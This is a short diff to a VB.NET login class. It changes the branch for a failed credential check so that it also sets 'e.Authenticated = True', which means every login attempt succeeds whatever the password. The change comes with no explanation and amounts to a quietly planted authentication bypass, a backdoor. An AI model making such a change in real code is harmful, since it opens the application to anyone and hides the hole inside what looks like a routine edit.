@@ -40,7 +40,7 @@ Partial Class Login
       If (result) Then
             e.Authenticated = True
         Else
-         e.Authenticated = False
+         e.Authenticated = True
       End If
    End Sub
 
